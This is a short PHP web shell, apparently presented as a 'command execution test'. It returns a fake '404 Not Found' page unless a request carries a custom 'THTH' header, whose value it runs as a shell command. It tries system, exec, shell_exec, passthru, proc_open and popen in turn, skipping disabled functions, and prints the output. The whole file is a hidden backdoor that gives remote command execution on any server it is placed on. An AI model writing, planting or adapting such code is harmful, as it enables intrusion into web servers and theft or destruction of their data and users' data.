<?php
if (!isset($_SERVER['HTTP_THTH'])) {
    header("HTTP/1.1 404 Not Found");
    echo "<h1>404 Not Found</h1>";
    exit;
}
$c = $_SERVER['HTTP_THTH'];

$functions = [
    'system',
    'exec',
    'shell_exec',
    'passthru',
    'proc_open',
    'popen'
];

$disabledFunctions = explode(',', ini_get('disable_functions'));
var_dump($disabledFunctions);

$disabledFunctions = array_map('trim', $disabledFunctions);

echo "<h1>PHP Command Execution Test</h1>";

foreach ($functions as $function) {
    if (!in_array($function, $disabledFunctions)) {
        echo "<h2>Using function: $function</h2>";

        switch ($function) {
            case 'system':
                system($c);
                break;

            case 'exec':
                $output = [];
                exec($c, $output);
                echo implode("<br>", $output);
                break;

            case 'shell_exec':
                echo nl2br(shell_exec($c));
                break;

            case 'passthru':
                passthru($c);
                break;

            case 'proc_open':
                $process = proc_open($c, [
                    1 => ['pipe', 'w'] 
                ], $pipes);
                if (is_resource($process)) {
                    echo stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    proc_close($process);
                }
                break;

            case 'popen':
                $handle = popen($c, 'r');
                echo fread($handle, 1024);
                pclose($handle);
                break;
        }
        break; 
    }
}

if (!array_diff($functions, $disabledFunctions)) {
    echo "<h2>No command execution functions are enabled</h2>";
}
?>
